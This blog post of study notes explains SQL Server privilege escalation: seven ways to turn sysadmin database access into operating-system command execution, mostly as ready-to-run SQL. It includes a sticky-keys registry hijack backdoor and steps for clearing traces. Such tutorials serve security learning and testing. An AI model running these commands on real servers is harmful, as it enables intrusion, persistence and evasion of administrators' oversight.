---
title: "SQL Server 提权"
date: "2024-11-13 17:40:19"
updated: "2026-05-30 19:30:09"
categories: ["文章", "学习笔记"]
tags: ["提权", "SQL Server"]
thumbnail: "/wp-content/uploads/2025/img-77468ee1746d.png"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "797"
---
<h2 class="md-end-block md-heading"><span class="md-plain">一、基础概念与前提</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">1. 核心前提</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">服务器已开启 SQL Server 服务并允许外联</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">拥有高权限账号（如 </span><span class="md-pair-s" spellcheck="false"><code>sa</code></span><span class="md-plain">，对应 </span><span class="md-pair-s" spellcheck="false"><code>sysadmin</code></span><span class="md-plain"> 角色，为最高权限）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">数据库未被降权（部分版本默认降权为 </span><span class="md-pair-s" spellcheck="false"><code>mssql</code></span><span class="md-plain"> 用户，可能限制操作）</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2. 权限判定</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">sysadmin（DBA 权限）</span></strong></span><span class="md-plain">：最高权限，可执行任意操作</span> <span class="md-plain">判定命令：</span><span class="md-pair-s" spellcheck="false"><code>select IS_SRVROLEMEMBER(&#039;sysadmin&#039;);</code></span><span class="md-plain">（返回 1 表示拥有）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">db_owner（dbo 权限）</span></strong></span><span class="md-plain">：数据库所有者，可执行数据库内大部分操作</span> <span class="md-plain">判定命令：</span><span class="md-pair-s" spellcheck="false"><code>select IS_SRVROLEMEMBER(&#039;db_owner&#039;);</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">public 角色</span></strong></span><span class="md-plain">：默认角色，权限最低</span> <span class="md-plain">判定命令：</span><span class="md-pair-s" spellcheck="false"><code>select IS_SRVROLEMEMBER(&#039;public&#039;);</code></span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">二、提权方法</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">1. xp_cmdshell 提权</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：通过扩展存储过程直接执行系统命令，返回执行结果</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">适用版本</span></strong></span><span class="md-plain">：2000 默认开启，2005 及以上默认禁用</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作步骤</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启用组件（需 sa 权限）：</span></p>



```sql
use master;
exec sp_configure 'show advanced options', 1;
RECONFIGURE;
exec sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250813172128581.png"><img class="alignnone size-full wp-image-798" src="/wp-content/uploads/2025/img-77468ee1746d.png" alt="" width="1246" height="562" /></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行命令：</span></p>



```sql
exec master..xp_cmdshell "whoami";
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250813172141241.png"><img class="alignnone size-full wp-image-799" src="/wp-content/uploads/2025/img-e0766a0a9c34.png" alt="" width="853" height="477" /></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">关闭组件（清理痕迹）：</span></p>



```sql
exec sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250813172200194.png"><img class="alignnone size-full wp-image-800" src="/wp-content/uploads/2025/img-8362c7b5e409.png" alt="" width="1235" height="511" /></span></p>
</li>
</ol>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">恢复方法</span></strong></span><span class="md-plain">：若组件被删除，可通过 DLL 恢复：</span></p>



```sql
exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll';
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2. sp_oacreate 提权</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：调用 </span><span class="md-pair-s" spellcheck="false"><code>WScript.Shell</code></span><span class="md-plain"> 等 OLE 对象，通过 </span><span class="md-pair-s" spellcheck="false"><code>sp_oamethod</code></span><span class="md-plain"> 执行系统命令</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特点</span></strong></span><span class="md-plain">：无回显，需将结果写入文件后读取</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作步骤</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启用组件：</span></p>



```sql
exec sp_configure 'show advanced options', 1;
RECONFIGURE;
exec sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250813172225576.png"><img class="alignnone size-full wp-image-801" src="/wp-content/uploads/2025/img-a155106568f2.png" alt="" width="1280" height="522" /></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行命令（例：添加用户并写入结果）：</span></p>



```sql
declare @ffffffff0x int,@exec int,@text int,@str varchar(8000)
exec sp_oacreate 'wscript.shell',@ffffffff0x output
exec sp_oamethod @ffffffff0x,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
exec sp_oamethod @exec, 'StdOut', @text out
exec sp_oamethod @text, 'readall', @str out
select @str;
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250813172502571.png"><img class="alignnone size-full wp-image-802" src="/wp-content/uploads/2025/img-c21f0ed372fe.png" alt="" width="1175" height="450" /></span></p>
</li>
</ol>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3. xp_regwrite 提权</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：修改 Windows 注册表（如添加启动项、映像劫持）实现提权</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">典型场景</span></strong></span><span class="md-plain">：劫持粘滞键（sethc.exe），替换为 cmd.exe</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作示例</span></strong></span><span class="md-plain">：</span></p>



```sql
-- 劫持粘滞键
exec master..xp_regwrite 
  @rootkey='HKEY_LOCAL_MACHINE',
  @key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File execution Options\sethc.EXE',
  @value_name='Debugger',
  @type='REG_SZ',
  @value='c:\windows\system32\cmd.exe';
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250813172642985.png"><img class="alignnone size-full wp-image-803" src="/wp-content/uploads/2025/img-75d7f9cd85f5.png" alt="" width="1315" height="629" /></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">验证劫持</span></strong></span><span class="md-plain">：</span></p>



```sql
exec master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File execution Options\sethc.exe', 'Debugger';
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250813172658493.png"><img class="alignnone size-full wp-image-804" src="/wp-content/uploads/2025/img-0e8ade0b60eb.png" alt="" width="1278" height="447" /></span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">4. 沙盒提权</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：利用 Access 沙盒机制，通过 </span><span class="md-pair-s" spellcheck="false"><code>openrowset</code></span><span class="md-plain"> 调用 mdb 文件执行命令</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">适用条件</span></strong></span><span class="md-plain">：32 位系统、存在 </span><span class="md-pair-s" spellcheck="false"><code>jet.oledb.4.0</code></span><span class="md-plain"> 驱动、sa 权限</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作步骤</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">开启分布式查询：</span></p>



```sql
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'Ad Hoc Distributed Queries', 1;
reconfigure;
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">关闭沙盒模式（修改注册表）：</span></p>



```sql
exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">配置 OLE DB 提供程序属性（适配不同 SQL Server 版本 ）</span></p>



```sql
-- Until SQL Server 2012
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'AllowInProcess', 1
EXEC master.dbo.sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0', N'AllowInProcess', 1

-- SQL Server 2014 or later
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'DynamicParameters', 1
EXEC master.dbo.sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0', N'DynamicParameters', 1
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行系统命令：</span></p>



```sql
Select * From OpenRowSet('microsoft.jet.oledb.4.0',';Database=c:\windows\system32\ias\ias.mdb',
'select shell("whoami")');
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250813173240518.png"><img class="alignnone size-full wp-image-805" src="/wp-content/uploads/2025/img-49c4863c8be4.png" alt="" width="1304" height="532" /></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">恢复配置</span></p>



```sql
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;
exec sp_configure 'Ad Hoc Distributed Queries',0;
reconfigure;
```


</li>
</ol>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">5. CLR 提权</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：利用 SQL Server 与 .NET CLR 的集成，通过自定义存储过程执行命令</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">适用版本</span></strong></span><span class="md-plain">：2005 及以上</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作步骤</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">开启 CLR 集成：</span></p>



```sql
exec sp_configure 'show advanced options', 1;
RECONFIGURE;
exec sp_configure 'clr enabled', 1;
RECONFIGURE;
ALTER DATABASE master SET TRUSTWORTHY ON;  -- 标记数据库为可信任
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注册自定义 DLL（含命令执行代码）：</span></p>



```sql
CREATE ASSEMBLY [MyAssembly] FROM 'C:\path\to\your.dll' WITH PERMISSION_SET = UNSAFE;
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建并执行存储过程：</span></p>



```sql
CREATE PROCEDURE sp_cmdexec @Command nvarchar(4000)
AS EXTERNAL NAME [MyAssembly].[StoredProcedures].[Cmdexec];
exec sp_cmdexec 'whoami';  -- 执行命令
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">清理痕迹：</span></p>



```sql
DROP PROCEDURE sp_cmdexec;
DROP ASSEMBLY [MyAssembly];
```


</li>
</ol>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">6. Agent Job 提权</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：通过 SQL Server 代理（SQLSERVERAGENT）创建计划任务执行命令</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作步骤</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启动代理服务：</span></p>



```sql
exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT';
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建任务并执行命令（例：写入结果到文件）：</span></p>



```sql
use msdb;
exec sp_delete_job null, 'test';  -- 删除同名任务（若存在）
exec sp_add_job 'test';
exec sp_add_jobstep null, 'test', null, '1', 'cmdexec', 'cmd /c "whoami > D:\result.txt"';
exec sp_add_jobserver null, 'test', @@servername;
exec sp_start_job 'test';  -- 启动任务
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">读取结果：</span></p>



```sql
bulk insert readfile from 'D:\result.txt';
select * from readfile;
```


</li>
</ol>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">7. 脚本执行提权（R/Python）</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：利用 SQL Server 2017+ 的机器学习服务，通过外部脚本执行命令</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作步骤</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">开启外部脚本权限：</span></p>



```sql
exec sp_configure 'external scripts enabled', 1;
RECONFIGURE;
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行 R 脚本：</span></p>



```sql
exec sp_execute_external_script
  @language=N'R',
  @script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir", intern=T))'
  WITH RESULT SETS (([cmd_out] text));
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行 Python 脚本：</span></p>



```sql
exec sp_execute_external_script
  @language=N'Python',
  @script=N'
    import subprocess
    p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE)
    OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])
  ';
```


</li>
</ol>
</li>
</ul>
